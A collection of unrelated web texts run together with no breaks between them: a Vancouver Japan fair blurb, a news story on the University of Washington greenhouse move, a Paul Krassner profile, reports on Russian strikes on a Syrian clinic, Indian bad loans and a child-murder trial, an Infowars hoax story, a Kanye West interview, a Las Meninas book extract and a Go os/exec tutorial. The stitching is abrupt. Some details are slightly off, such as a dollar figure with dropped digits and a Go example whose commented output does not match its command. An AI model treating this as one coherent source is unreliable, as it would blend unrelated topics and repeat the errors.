I had a “sugoi” day 1 at the Sakura Days Japan Fair at VanDusen Botanical Garden, and although I didn't have time to try the food (I was too busy filming the event), I did catch the performance of Japanese musicians Koji Yamaguchi & Yoshihiko Fueki and it was really “sugoi desu ne”
I bought Koji Yamaguchi's CD for $10, and he signed it.

The University of Washington is moving most of its collection of 9,000 greenhouse plants to a temporary, free greenhouse space, offered by Amazon.
What do University of Washington botanists and the online retail giant Amazon.com have in common?
Rare and exotic plants.
For the next two years, most of the UW's collection of 3,400 specimens of plants — 9,000 in all — are moving into a Redmond greenhouse once owned by Molbak's and now offered to the university for free by Amazon.
Amazon has greenhouses in Redmond because it's building a collection of plants to live in its glass-and-steel spheres taking shape in downtown Seattle. And the UW is building a new, 20,000-square-foot greenhouse as part of its $165 million Life Sciences Building, a five-story, glass-and-steel structure that will go up alongside the Burke-Gilman Trail.
The plants, which live in the 67-year-old Botany Greenhouse, must move because the greenhouse will be razed this summer to make way for the new building.
With room, apparently, to spare, Amazon offered the UW free use of a Redmond greenhouse, an in-kind contribution worth more than $200,000, the company says. About 1,000 of the plants will be housed in the UW's Center for Urban Horticulture.
“It was a meeting of minds of plant-oriented people,” said Toby Bradshaw, chair of the Biology Department. Ron Gagliardo, Amazon's horticulturist, helped arrange the deal that gives the UW free greenhouse space, he said. And Amazon will get some benefit from the arrangement — it will be able to propagate some of the UW's unique and rare species to grow in its spheres.
Tuesday was moving day at the UW greenhouse, and volunteers, including more than a dozen members of the Husky football team, pitched in. “Coming through,” they called out, wheeling trolleys of carnivorous plants, epiphytes and cactuses with little Styrofoam peanuts stuck on their spines.
The plants were chosen for the UW greenhouse collection because they are academically interesting, and because they represent a wide diversity of plant species. Bradshaw said the collection represents 1 percent of all plant species in the world.
“Yes, it is amazing,” he said. “You can see 1 percent of all the plants in the world just by visiting this greenhouse.”
But not for a while. The UW collection will be off-limits to the public during its stay in Redmond. When the new Life Sciences Building opens in fall 2018, the greenhouse doors will again open to the public.
The collection includes rare plants like Wollemia nobilis, an Australian conifer thought to be extinct until it was discovered in a valley in 1994. National Geographic researchers propagated the tree and gave one of the offspring to the UW.
“Really, it would prefer to be outdoors,” said interim greenhouse manager Jeanette Milne, looking up at the tree that was stretching toward the glass ceiling. When the new building opens, Wollemia nobilis is likely to be planted outside, where it could grow 30 feet tall.
The collection also includes Welwitschia mirabilis, or tree tumbo, a plant with big, straplike leaves, native to South Africa, remarkable for its long life span — the plant can grow for 1,000 years — and its ability to survive in an incredibly dry habitat.
“These are a conifer, like a Douglas fir or a pine. You'd never guess by looking at something like this that it is related to the Doug fir,” Bradshaw said, pointing to the two thick, broad leaves coming out of a bulbous base.
There are the carnivorous plants — the pitcher plant, the cobra lily, the sundew. One of the oddest plants in the collection is Nepenthes lowii, a pitcher plant from Borneo, which produces a sticky white bait that attracts the tree shrew. The bait includes a powerful laxative, and when the shrew eats the bait, it poops in the plant's bulbous pitcher, providing a shot of nitrogen and other nutrients.
“It's also known as the shrew loo,” Bradshaw said.
UW botanists took the plant on a visit to Woodland Park Zoo's tree shrews, and “The minute they saw it, they ran to the plant and began eating the white goo,” he said.
There's the crowd-pleasing Amorphophallus titanum, or corpse flower — the UW has several of them — a plant that produces a single flower that smells of a rotting corpse. The last time the flower bloomed, Bradshaw said, 4,000 people visited the greenhouse to see it.
The Botany Greenhouse was built in 1949 for a professor who wanted to grow corn in Seattle as part of his work on genetics. When that professor later shifted his attention to yeast, the greenhouse languished and fell into disrepair, Bradshaw said. In the early 1980s, it was taken over by UW botanists who began building a collection that spanned the globe.
On Tuesday, about two dozen Husky football players helped move plants throughout the morning. They were there at the urging of wide receiver Taelon Parson.
A junior majoring in biology, Parson had heard about the need for volunteers with muscle when he was at a Biology Department dinner (he'd been awarded an “excellence in biology” award, along with a scholarship). He offered to get some guys from the football team to help.
A few days later, he approached one of the team's weight trainers. “Can I say something to the guys about plants?” he asked.
The trainer responded: “Plants? What are you talking about?”
Parson had to twist a few arms to convince his fellow teammates, but by Tuesday, more than two dozen football players wearing Husky T-shirts and shorts were lifting pots and wheeling trolleys out of the hot greenhouse and into waiting trucks.
Parson was dressed for the occasion: Along with his Husky T-shirt and shorts, he wore a pair of flowered socks.
Decades before Jon Stewart brought his popular admixture of satire and journalism to the mass media on Comedy Central, the unique hybrid of the two genres could be found regularly in only one very hip and often outrageous media outlet.
But Paul Krassner, the self-described “investigative satirist” who pretty much invented the form in his late 1950s magazine, The Realist, did not stop at being just an entertainer. Krassner, whose 80th birthday will arrive on April 9, was also a child prodigy classical violinist; a stand-up comic who learned his craft at the knee of Lenny Bruce; a fellow traveler with novelist Ken Kesey and his Merry Pranksters on their path-breaking, hallucinogenic cross-country tour in Kesey's psychedelic painted bus, and a cofounder, with Jerry Rubin and Abbie Hoffman, of the Youth International Party, which in 1968 nominated a pig for president in Chicago's Grant Park, amid clouds of tear gas and hails of nightsticks from Chicago's finest during the 1968 Democratic Party National Convention.

Krassner still does stand-up — though these days he stands up with a cane. And he still plays peek-a-boo with his Jewish identity, flashing a now-I-am-now-I-ain't iconoclasm that may belie a deeper ambivalence.
“Whenever somebody says ‘Oy,' I automatically say ‘Vey,' but I'm not Jewish,” he steadfastly maintained in a telephone interview from his home in Desert Hot Springs, Calif. There, in late April, friends and relatives will celebrate the official arrival of octogenarian status for the Yippie whose party's slogan was “Never Trust Anyone Over 30.”
From 1958, when Krassner launched The Realist from the offices of Mad magazine, through the early 1970s, the magazine mixed truth, fiction and outrage in a blender designed to fuse all three at a molecular level. For example, it published some of the earliest Kennedy assassination conspiracy theories. But some were more serious than others, and after a while it was hard to tell which was which. Which was kind of the point.
Krassner is credited with naming the political activist group known as the Yippies (aka Youth International Party), whose members once attempted to levitate the Pentagon. The party's other founders, Rubin and Hoffman, stood trial as two of the Chicago Seven for their roles in mass protests during the Democratic convention. All were ultimately acquitted, and a federal investigative commission later concluded that the turmoil and disorder that took place there were, in part, “a police riot.”
Designated a “raving, unconfined nut” in FBI surveillance files, Krassner's destiny was anything but foreordained for someone growing up during the postwar era in the Astoria section of Queens. He was, he noted, the product of a typically assimilated Jewish family that belonged to the Astoria Center of Israel (“Formerly known as the Astoria Center of Palestine,” Krassner cracked).
“My family had dinner at a Chinese restaurant every Friday. My parents went to synagogue, but only on the High Holy Days, and they would light the candles in memory of dead grandparents, but that was about it. On Sunday we had bacon and eggs for breakfast,” Krassner said.
Krassner went to Hebrew school, he said, “but only to please my parents.” Even there, he played the trickster, questioning the rabbi who instructed his class that circumcision was a covenant with God. “I challenged him, saying if circumcision wasn't voluntary, it wasn't a covenant,” Krassner recalled. “He agreed, and said: ‘Okay, it's not a covenant anymore. It's an obligation.'”
The Astoria rabbi had a stutter that became an issue during Krassner's bar mitzvah. “When the father of the bar mitzvah boy is supposed to repeat some stuff, the rabbi goes, ‘BB-bb-ruch Aaa-tah Aaa-aadonai….' So my father, who doesn't know Hebrew and thought that was the correct pronunciation, goes ‘BB-bb-ruch Aaa-tah Aaa-aadonai.'
The rabbi got mad and started chastising my father right there in front of the whole congregation because he thought my father was making fun of him. My father wasn't trying to get a laugh; he was trying to be accurate. My relatives started yelling at the rabbi for yelling at my father. ‘Stop, stop! He didn't know!' It was shocking and entertaining.”
Incidents in which reality collided with propriety nurtured Krassner's sense of the absurd from an early age. Krassner recalled how as a violin prodigy, he made his debut at Carnegie Hall. The young soloist in short pants felt an itch and, in midconcert, balanced on one leg to scratch with his other foot. The audience laughed. Enjoying this response, he repeated the gesture, earning the same response — and so the stand-up comedian was born.
“Laughter is your first language,” Krassner said. “It's a bunch of folks leaning over the crib, laughing at everything you do.”
The innocence at the heart of all humor is something he experienced during a tour in Ecuador with his daughter, Holly (now married with a child of her own), to visit tribal shamans. “We lived in a shack in the jungle with three generations of an indigenous tribe. I was wearing bug-eyed green sunglasses that I'd picked up quickly in a store — and they couldn't stop laughing at my shades. To them it was the funniest thing they'd ever seen,” he said.
Krassner has never visited Israel, but he came close in 1978, when he accompanied the Merry Pranksters to Egypt for a Grateful Dead concert in Giza, by the Pyramids. Despite his disavowals of religion, biblical references pop up in Krassner's dialogues as frequently as in a rabbi's sermon.
“I am an atheist, but I have a constant dialogue with the deity I don't believe in,” he said. That conversation, according to Krassner, goes something like this:
Krassner: “So you knew what would happen when you told the Jews that Palestine was the Promised Land, that the Arabs wouldn't just say: ‘Welcome. Please help yourself to some of our land.'”
God (in a booming voice): “I never promised anything. I just said I'll see what I can do.”
Sometimes, like Forrest Gump, Krassner seems to have rubbed shoulders with nearly everyone who contributed to the counterculture of the 1960s. Once, he related, he was a speaker on a panel that included Hoffman and Rabbi Meir Kahane, the radical right-wing founder of the Jewish Defense League. “Bob Dylan was there, too, hanging out backstage with his Hebrew teacher, a guy called One-Legged Terry,” Krassner recalled. “I asked Dylan how come he was learning Hebrew, and he said, ‘Because I couldn't speak it.' I asked him how he felt about the Holocaust. Dylan, a minimalist, said, ‘I resented it.'”
Krassner cited that moment as a “spiritual orgasm, when you're laughing and crying and can't tell the difference between the two, when satire and truth become the same thing.”
Krassner lives in a desert community not far from Palm Springs, Calif., with his wife of 24 years, video journalist Nancy Cain. He keeps busy. Two Krassner books will be published this year, including a rerelease of his 1999 complilation, “Pot Stories for the Soul: An Updated Edition for a Stoned America,” and his 1994 “Confessions of a Raving, Unconfined Nut: Misadventures in the Counter-Culture,” originally published by Simon & Schuster, with an expanded edition available on his website and as an e-book on Kindle.
“I still have my hooked nose, my best friends are Jewish, and occasionally I have dinner at a Jewish restaurant,” he said. “And I still hum ‘Adon olam, asher malach' during interviews,” as he proceeded to demonstrate. “But I don't believe that Jews were the chosen people. I don't even believe that people are the chosen species.”

Russia launched its Syrian air campaign on September 30 (AFP Photo/)
Beirut (AFP) - At least 13 people including medical staff were killed when Russian warplanes struck a field hospital in northwestern Syria, the Syrian Observatory for Human Rights said Wednesday.
"Thirteen people were killed in Russian air strikes on Tuesday on a field clinic in the town of Sarmin, including a physiotherapist, a guard, and civil defence member," the Observatory's Rami Abdel Rahman told AFP.
Sarmin lies in the northwestern province of Idlib, which has been regularly targeted by Russia's military since the beginning of its air war in Syria on September 30.
The clinic was run by the Syrian-American Medical Society, whose staff confirmed that strikes had "severely damaged" the facility.
"Yesterday at around 1:00 pm (1000 GMT) a SAMS facility near Sarmin, Idlib was hit," a SAMS staff member told AFP.
"Our initial reports from the ground show that we have lost two hospital staff, a physiotherapist and a nurse," the staffer said in an emailed statement.
Speaking on condition of anonymity, she did not specify whether the strikes were conducted by Russian warplanes.
Russia's defence ministry said on Wednesday that its armed forces had targeted Sarmin, but did not mention the hospital.
Russia has conducted more than 500 strikes against what it says are Islamic State group fighters.
But Moscow has come under fire for targeting non-extremist groups and inflicting civilian casualties.
On Tuesday, the Observatory said at least 127 of the 370 killed so far in Russia's aerial war are civilians.
It documented Russian bombardment of field hospitals in coastal Latakia and central Hama on October 2.
In an online statement, SAMS said Russian air strikes the same day hit a field hospital it operated in Hama, "causing severe damage to the facility" and wounding staff.
Journalist and activist Maamun al-Khatib told AFP that Russian raids had struck two hospitals in the northern province of Aleppo in the past week.
More than 250,000 people have been killed since Syria's conflict began in March 2011, and more than 11 million people have been forced to flee their homes.
Alleged former DoD veteran claims conspiracy behind pop star's death
Paul Joseph Watson
Infowars.com
September 18, 2013
In what appears to be the Internet's latest and greatest hoax, a whistleblower who claims he worked for the Department of Defense purports to have leaked Michael Jackson's final phone call before his death, during which the pop star voices his fear of a government conspiracy to murder him.
Robert Connors, about which no information can be found online, claims he worked with the DoD for 20 years after serving in “active duty campaigns” in Iran and Vietnam.
The whistleblower goes on to claim he was involved in Operation Sedgwick, an offshoot of MK-Ultra, which revolved around “the control of the African-American population and the urban youth through music.”
During Michael Jackson's alleged final phone call before his death, the pop star warns of a plot by powerful forces to murder him via a staged drug overdose.
“It's not the government, it's more than the government,” the voice on the clip states, during an alleged conversation with Jackson's former manager Dieter Wiesner.
Connors threatens to release more audio and video tapes concerning “Operation Sedgwick” unless authorities come clean about the program by September 23rd.
The whistleblower's body language in the clip does not lend itself to authenticity, and although the voice on the audio recording does sound like Michael Jackson, the scene feels scripted and acted out.
Like all good Internet hoaxes, the story plays into viral conspiracies about the gang shooting of hip-hip icon Tupac Shakur and the use of rap music as a form of mind control.
Speculation that Jackson was killed because he was about to expose the Illuminati's control of the music industry, and that this was the reason behind the child abuse allegations leveled against him, has also raged on fringe conspiracy forums for years. In 2002, Jackson gave an anti-music industry speech during which he held up a sign which read, “$ony Kills Music.”
The whole cultural phenomenon of the Internet hoax is fascinating. There are so many verifiable, documented cover-ups that we can manifestly prove and yet somehow people aren't that interested in the tangible. They seem to be more interested in the mysterious, the theatrical, and are even willing to suspend their own disbelief simply to revel in the allure of the murky conspiracy.

West addresses comments from 50 Cent and others about his wardrobe: 'There's a lot of gay people that I dress way better than.'
No matter what you might think about [artist id="1230523"]Kanye West[/artist], he's definitely secure with his raps and with himself. On the Grammy stage on Sunday night, he laid the first verse on "Swagga Like Us," knowing that he had three more acclaimed wordsmiths — [artist id="1269"]Jay-Z[/artist], [artist id="510062"]Lil Wayne[/artist] and [artist id="1225081"]T.I.[/artist] — coming after him on the track, and still felt confident that his rap held up in such strong company.
Kanye does exactly what he wants to do, so it's no surprise that he took the stage in a sparkling jacket that could have come out of Michael Jackson's closet in 1984.
Still, Kanye's clothes have become a major topic lately. In a recent interview with MTV News, [artist id="860639"]50 Cent[/artist] joked heavily about West's choice of wardrobe. And Fif isn't the only one: On the Internet, fans and bloggers alike have questioned the Chicago native's garment picks.
In that interview, 50 denied that he was referring to West when he said in his song "Play This on the Radio," "first they say, 'That f----t hot" — although in January, when 50 was a guest on DJ Whoo Kid's satellite radio show, he hinted that he might have been talking about Kanye on the song when he made reference to West's sexuality. When asked about the comments by MTV News last week, 50 told us with a grin, "I never said Kanye's name."
During a sitdown interview with Sway on Friday, West talked very candidly about a myriad of issues, including certain people not understanding his at times eccentric fashion statements.
Sway: Kanye, you've become a fashion icon. But along with the accolades you get for setting trends, like you did with the "Stronger" glasses and even the 808s & Heartbreak heart pendants, some people really mock you because of the way you dress. If you look on the Internet, there are even some of your peers and fans that say you "dress gay." What does that mean to you?
West: Well, it's like when people say, "Give me a natural pose." You can't pose natural. If you're posing, then it's not natural no more. So it's statements that people say. "Dressing gay" you can't dress like ... Your dress don't give away whether or not you like a man. Think about actors that straight dress up like a woman or something like that. People wanna label me and throw that on me all the time, but I'm so secure with my manhood. And that's the reason why I can go to Paris, why I can have conversations with people who are blatantly gay.
'Cause I used to be scared to talk to a gay person. It's designers that's scared of people in hip-hop. And in hip hop, there's people — and let's not even say scared like homophobic — but they're scared of the way people gonna look at them. If you see a person be like, "I don't wanna stand next to Marc Jacobs 'cause I don't want that to bear on me because I'm just so cool." One of the reasons why, the perspective I come from with my raps and my songs, the reason why can't anybody dis me — no gangsta rapper, nobody can really dis me is 'cause it's so authentic.
Sway: Tell me about the now-infamous Paris picture.
West: I'm gonna tell you something about the Paris pic. They were like, some of the people dressed in the outfits, I didn't check out everybody's outfit that hopped in the picture with me — I can't be completely responsible. You go right into my outfit, my outfit is good. And see, like the [Fonzworth] Bentley video, "Everybody," there was people calling me before we dropped it, like "Man y'all shouldn't put that out with y'all dancing, man. People gonna say y'all gay!" And another thing is, people are so gay-conscious now. That's like the whole thing like with the Internet — every day [is like], "Oh I can tell he is gay now!" But back in the day, people used to have songs like "Get In That A--" or something like that. Someone would never make a song like that [today] because they'd be like "Whoa! I can make no song like that! People gonna call me gay!"
Sway: But that picture made so much noise. There were a lot of colors, right?
West: It was a lot of colors. Let me tell you another thing about ... I'm doing a blog right now where I've been collecting all of the freshest stuff that's rainbows — Denver Nuggets jerseys, BAPE shoes, Nikes with rainbows on 'em — and saying, "Man I think as straight men we need to take the rainbow back because it's fresh." It looks fresh. I just think that because stereotypically gay people got such good like style that they were smart enough to take a fresh-ass logo like the rainbow and say that it's gonna be theirs. But I was like "Man I think we need to have the rainbow" — the idea of colors , life and colors and stuff, I mean how is that a gay thing? Colors? Having a lot of colors is gay?
Sway: You once were quoted saying that you were inspired in fashion by how gay people dress.
West: And you know what? That's when I was ignorant to gays. 'Cause there's a lot of gay people who don't dress good at all. There's a lot of gay people that I dress way better than.
Indian banks' sour loans hit a record 9.5 trillion rupees (5.56 billion) at the end of June, unpublished data shows, suggesting Asia's third-largest economy is no nearer to bringing its bad debt problems under control.
Indian banks' sour loans hit a record 9.5 trillion rupees ($145.56 billion) at the end of June, unpublished data shows, suggesting Asia's third-largest economy is no nearer to bringing its bad debt problems under control. A review of Reserve Bank of India (RBI) data obtained through right-to-information requests shows banks' total stressed loans – including non-performing and restructured or rolled over loans – rose 4.5 percent in the six months to end-June. In the previous six months they had risen 5.8 percent. While banks remain the main source of funding for India's companies, the stubborn bad debt problem has eaten into bank profits and choked off new lending, especially to smaller firms, at a time when an economy that depends on them is stalling. India grew at its slowest pace in three years in April-June – a concern for the government of Prime Minister Narendra Modi, who faces elections in 2019 and has pledged to create millions of new jobs before then.
Banks are having to take higher provisions to account for more defaulters being pushed into bankruptcy. And margins are likely to be squeezed further by proposed new rules to encourage commercial banks to pass on central bank interest rate cuts. To be sure, the bulk of India's sour loans are in the state banks and stem from lending to large conglomerates, especially in steel and infrastructure. But analysts say the rise in bad loans among small firms, and even retail borrowing, is worrying and will do little to encourage new loans to help fuel growth.
“On the corporate side, we think it's a recognition cycle which is nearing an end,” said Alka Anbarasu, senior analyst at Moody's Investor Service, referring to more bad loans being recognised as such, as banks come under pressure from the RBI and other regulators. “But it's really those data points beyond corporate that are causing some worry.” Anbarasu forecast weak quarters ahead for banks before profitability picks up, and several senior bankers from public sector lenders – which account for more than two-thirds of Indian banking assets – agreed the months ahead would be strained. Stressed loans as a percentage of total loans reached 12.6 percent at end-June, according to the RBI data, the highest level in at least 15 years.
HIGHER PROVISIONS, WEAKER LOANS
Part of the issue for banks and the government is a strict provisioning regime: the RBI wants banks to provide for at least 50 percent of the secured loans to companies taken to bankruptcy proceedings, and 100 percent for the unsecured part. A dozen of the biggest such cases account for nearly 1.78 trillion rupees, or a quarter of total non-performing assets. For those companies, banks will need to provide 180 billion rupees on top of existing provisions, according to July estimates from India Ratings and Research, the local affiliate of Fitch Ratings. More than 20 other sizeable companies are at risk of being taken to bankruptcy court.
Bankers say these and other pressures – including rising government bond yields that forced banks to post mark-to-market losses – have added to the squeeze, and hit new loans. According to RBI data, new loans grew at just about 5 percent in the year to March, the lowest growth rate in more than six decades. Several banks have already cut back their loan books to conserve capital. “What are they (RBI) thinking while they're taking these steps all at the same time?” said a treasurer at a state-run bank, who didn't want to be named due to the sensitivity of the issue. “Do they want banks to wind up their businesses, or do they want to save the banks?” Treasury income accounted for 22.7 percent of banks' operating profits in the last financial year, doubling its share from a year earlier, India Ratings estimates.
“The almost zero treasury income will hit provisioning ability and, in turn, make it more difficult for weaker banks to give loans as capital becomes more scarce,” said Soumyajit Niyogi, an associate director at the rating agency. A senior policymaker, who requested anonymity as the discussions are not public, said the government would have to help to sufficiently capitalise the banks. Fitch Ratings estimates Indian banks will need $65 billion of additional capital by March 2019 to meet Basel III global banking rules. Moody's expects the top 11 state lenders alone will need nearly $15 billion. The government has just $3 billion left in its budget for bank recapitalisation. “We think capitalisation is the biggest challenge for the banks at the moment, given that earnings will remain subdued and will not support any capital generation,” said Moody's Anbarasu.
Image caption Daniel Pelka was sent to school with a "slice of bread cut in half with ham inside"
A four-year-old boy alleged to have been starved and murdered by his mother and stepfather would steal food at school, a court has heard.
Jurors at Birmingham Crown Court were told Daniel Pelka's lunchbox contained half of a sandwich when he was sent to Little Heath Primary School, Coventry.
A member of staff at the school said Daniel would "eat anything he could get his hands on".
His mother, Magdelena Luczak, and her partner, Mariusz Krezolek, deny murder.
The pair, who came to Britain from Poland in 2006, also deny causing or allowing his death but have both admitted a charge of child cruelty.
The four-year-old is alleged to have died from a head injury following a campaign of "incomprehensible" cruelty by Ms Luczak, 27, and Mr Krezolek, 33.
'Stood out instantly'
Teaching assistant Amy Tokely broke down in tears when she told the court Daniel wanted to eat "muddy and dirty" pancakes which had been on the floor.
Ms Tokely said: "Daniel stood out from the other children within the first couple of hours of me being in the classroom.
"I had noticed that he helped himself to fruit [from a fruit bowl] a number of times and he kind of stood out instantly."
When asked by prosecutor Jonas Hankin QC what the boy had in his lunchbox, Ms Tokely replied: "Initially it was a slice of bread cut in half with ham inside.
"He would have a drink and on occasion he would have perhaps some loose crisps in a bag."
The witness added that he eventually got a full sandwich and never failed to finish his lunch.
'Losing weight'
The court was told he was seen looking for more food in other schoolchildren's lunchboxes which prompted teachers to lock them away in an office.
Ms Tokely said she noticed a change in Daniel's appearance following the February half-term break prior to his death in March 2012.
"He appeared to be losing weight. His skin was very pale and his hair had gone straw-like," she said.
"It was noticeable. His clothes were hanging off him and his attempts to get food became desperate."
The trial continues.
Michael Jacobs's last book was an attempt to unlock the mysteries of a painting that had been a lifelong passion, Velázquez's Las Meninas. In this extract he relates how it all started… • Read Ed Vulliamy on completing his dying friend's last work here
The envelope, postmarked Madrid, torn slightly on the lefthand corner, released, on opening, the pieces of a puzzle. “A jigsaw postcard,” explained a handwritten note inserted amidst the scrambled contents. “I found this in the gift shop of the Prado,” continued the mysterious sender. “I couldn't decide at first whether you would want the picture as a fridge magnet, a notebook cover, a mouse pad, or a laminated coaster.” The rest of the message, I gathered, would only be revealed once I had put the card together.
I was able to do so almost without thinking. I knew the painting so well that I felt now almost extraneous to its reassembly. As if I was just a spectator watching a group of actors silently taking up their positions at the start of a play: the painter behind his easel; the child princess centre stage, the maids of honour alongside her; the shadowy couple behind; the dwarf and midget in front; the mastiff beside them; the lone courtier in the distance, posed on a flight of steps.

I turned the card over carefully, as if handling evidence from a crime scene. I glanced automatically over the identifying inscription reading “Diego Velázquez, Las Meninas, 1656, Museo del Prado”, before turning to a signature as cramped and barely decipherable as the sender's handwriting. I pored over it for ages, until suddenly I realised whose it was. The person I remembered simply as Royce, whom I had not thought of in more than 30 years.
We had studied Spanish together during our privileged days at a school attached to London's Westminster Abbey. I had been with him briefly in Madrid as a 17-year-old, and had even gone with him once to the Prado. He did not share then my great enthusiasm for the visual arts, and had once mildly mocked me for socialising at school with an intellectually pretentious and elitist group whom he liked to characterise as the “swarthies”. Royce and I had little in common, other than an interest in Spain and the Spanish language, which he professed to have cultivated largely in the belief that the Hispanic world would one day be the driving force behind the global economy. He envisaged a career as a businessman. He went on to achieve this ambition, as I discovered from regular Christmas cards he persisted in sending me for several years after we had last seen each other.
He suggested I was devoting far too much time to art and not enough to living… what I really needed was a girlfriend
And now he was writing to me again, in so bizarre a fashion, and after such a long silence. His reason for doing so became gradually clearer as I struggled on with his near illegible words on the back of the jigsaw. I managed at last to find out that he was retired, divorced, and living on his own in Madrid, where he hoped I would go and visit him one day. “You'll be amused to hear that I've taken to visiting the Prado whenever my health allows. I often stop to study Las Meninas. You always said it was your favourite painting. You used to speak about it with such passion.”
I tried imagining myself as I was then, standing with Royce in front of Las Meninas, expounding on the painting with the gushing hyperbole of an adolescent. I was still at the innocent phase of my lifelong infatuation with Spain, and was probably telling my companion about the quintessential Spanishness of the work, its exotic and surreal character, its mixture of sombreness and sensuality, its element of the grotesque, its underlying magic. I had certainly spoken to Royce about Velázquez's uncanny naturalism, his unrivalled ability to convey fabrics with a few rushed brushstrokes, to create spaces that invite you to enter, people with whom you feel you can talk, children that actually look like children, dogs you want to stroke, skin that has the true colour of skin. For it must have been at this point in our Prado visit, as I elaborated on the confusion in Velázquez between painting and life itself, that my hitherto silent companion decided he couldn't bear any more of this.
He suggested I was devoting far too much time to art and not enough to living. He interpreted the passion with which I spoke about painting as my way of sublimating sexual frustration. He told me that what I really needed was a girlfriend, and that I would be better off going to bars and discos than spending so many hours visiting monuments and museums. Though I would gradually recognise the truth of his words, their immediate impact was to irritate me profoundly, as did his subsequent gesture of walking off in the direction of a young woman whom he said was more beautiful than any of the pictures we had seen. It was as if he had violated the inner sanctuary of a temple.

Looking back now to that incident in the Prado, I saw it as encapsulating a moment in my life when, for all my complexes and self-doubts, I was fired by an absolute, unembarrassed conviction in art's spiritual, redemptive powers. Later, after going on to study art history at London's Courtauld Institute of Art, my views on art became more complex and sceptical, leading eventually to a gradual disillusionment with my chosen discipline, and with the academic world in general.
What I never lost was my fascination with Las Meninas, partly because it was so tied up with my developing relationship with Spain and the Hispanic world. For, as I began returning to Spain with ever greater frequency, and as a passion for life subsumed one for art, I came almost to think of the painting as a watchful, background presence, accompanying me as I became progressively more caught up with a country moving from a repressive dictatorship to a vibrant democracy, to a disenchanted place on the verge of collapse. Even in the heart of the Spanish countryside, where I have been largely living for more than a decade, far from the world of high culture, I have been reminded of the painting in the most unexpected ways: by a reproduction of it on a builder's grubby T-shirt; by a solitary exhibition catalogue in the house of my goatherd neighbour; by a puppy I was given who has grown up to be identical to the mastiff in the work's foreground.
Reading Royce's card, I was reminded of the bumptious and proudly philistine schoolboy I had known, and of a now ageing, ailing and lonely-sounding man discovering at last the haunting appeal of Las Meninas. And I started to speculate as to whether this work, painted only a few years before the artist's death, held new depths of meaning for those ever more conscious of mortality. And then I wondered if the puzzle I had been sent was Royce's way of telling me this. Of encouraging me perhaps to head deeper into what I would soon perceive as an ever-expanding labyrinth.
So I decided, as I neared the age of 60, to look more closely at a painting that is famously a mystery. A mystery that at first sight might not seem like one. A work that could easily strike the viewer simply as a realistic portrayal of Spanish court life, with the artist painting in his studio, and a young princess visiting him there with her retinue.
Could the composition's exact mathematics harbour secret codes?
“Life itself” was how Las Meninas was characterised by Velázquez's 18th-century biographer Antonio Palomino, who was able to name all the people in the painting, and to state that the mirror in the background, with its reflection of the king and queen, was the artist's clever way of revealing what is on the front of the large canvas on which he is working. Palomino was lucky enough to have been able to research his account of Las Meninas when there were still people around with memories of when it was painted. He is a reliable source.
And no one at first would doubt him, or think of Las Meninas as anything other than an informal, ingenious and exceptionally lifelike portrait of an extended family which the artist has proudly come to feel part of. Indeed it was as a marvel of naturalism, as an almost photographic representation of reality, that the painting first achieved international recognition, from the early 19th century onwards, during a period in art when the search for such qualities became a dominant obsession.
But there is something about Las Meninas that ultimately persuades the viewer that there is much more to it than what immediately meets the eye. The way in which all of the figures appear isolated in their own worlds. The almost supernatural brilliance of a technique whereby, in the words of Palomino, brushstrokes that from close up are barely intelligible should appear miraculous from a distance. The possibility that the composition's exact mathematics should harbour secret codes. The hint of wondrous worlds lying beyond the mirror and the open door beside it.
Which is why Las Meninas has come to appear increasingly less straightforward the more people have thought about it.
Facebook Twitter Pinterest Las Meninas (detail: ‘Above all, there have been speculations about the mirror,' writes Jacobs. Photograph: Corbis
Questions are still regularly asked that challenge even the most basic previous assumptions of what is happening in the work. Have the princess and her retinue come to visit the studio, or has someone come to visit them? Is the midget placing his foot on the dog with the intention of playing with him or of rousing him from sleep? And, if the dog is being woken up, does this imply that everyone in his party is on the point of leaving the room? And has the background door been opened in preparation for this possible departure, or because everyone has just entered from there?
Above all, there have been speculations about the mirror, for, as early as the 1880s, there have been critics and historians who have claimed that this does not reflect the hidden picture on the easel but rather the actual King and Queen, who have approached the studio so as to watch the artist paint their daughter, or perhaps even the canvas later known as Las Meninas. Why, others have asked, does everyone blindly accept Palomino's identification of the figures in the painting but not always his assertion about the mirror? But the debate as to what the mirror was intended to show had at least the effect of drawing attention to the monarchs' likely presence in the room, whether as models or as spectators. And this in turn helped promote an idea that would give the painting an especial relevance to the modern age: that the monarchs, if they really are in the artist's studio, would be occupying the same position as we ourselves do in viewing the work.
This was a notion that opened up a whole new range of interpretative possibilities. It marked a turning point in the appreciation of Las Meninas. A moment when an icon of realism was transformed into what the contemporary British artist Mark Wallinger has called the first “self-conscious” work of modern art. A moment when a painting that captures so astonishingly the surface of life became as well a profound meditation on the relationship between life and art.
Executing Commands In Go
Mon, Aug 18, 2014
The ability to execute external commands from within an application is something I often feel is a bit hackish and I haven't yet discovered a language that handles it as well as I would like. That was until I learned to love how Go tackles the challenge. This post will show you how to make the most of os/exec .
I tend to feel that there are three different types of command execution within applications.
Plain output. For when you always expect the command to execute but all you want from it is the output.
Exit codes. These perform some cleanup, setup or check and you want to discard any output but assert the exit code.
Long running processes. This case is rarer but there are times when I want to spawn sub-processes. Maybe even starting up another server to proxy to for instance.
So how do I handle these in Go? The magic all comes from the wonderful os/exec which is part of the Go standard library. Using this library, commands become a first class citizen within your application.
For all examples I am only going to include the primary logic but I will keep a link to a full copy in the Go Playgroud. The copies won't execute within the Playground due to the restrictions Google has in place but they should run fine locally.
I have defined the following functions to keep the examples short:
func printCommand(cmd *exec.Cmd) { fmt.Printf("==> Executing: %s
", strings.Join(cmd.Args, " ")) } func printError(err error) { if err != nil { os.Stderr.WriteString(fmt.Sprintf("==> Error: %s
", err.Error())) } } func printOutput(outs []byte) { if len(outs) > 0 { fmt.Printf("==> Output: %s
", string(outs)) } }
Collecting output
The first and most obvious use is to collect output from an external command. An easy way to do that is to use the CombinedOutput function.
// Create an *exec.Cmd cmd := exec.Command("echo", "Called from Go!") // Combine stdout and stderr printCommand(cmd) output, err := cmd.CombinedOutput() printError(err) printOutput(output) // => go version go1.3 darwin/amd64 // http://play.golang.org/p/-7PWDpt6zS
This works well if you also want to check for any error messages output but if you want finer control over the output of a command then we can route it into different buffers giving us control over both standard output and standard error.
// Create an *exec.Cmd cmd := exec.Command("go", "version") // Stdout buffer cmdOutput := &bytes.Buffer{} // Attach buffer to command cmd.Stdout = cmdOutput // Execute command printCommand(cmd) err := cmd.Run() // will wait for command to return printError(err) // Only output the commands stdout printOutput(cmdOutput.Bytes()) // => go version go1.3 darwin/amd64 // http://play.golang.org/p/_6xke11GMp
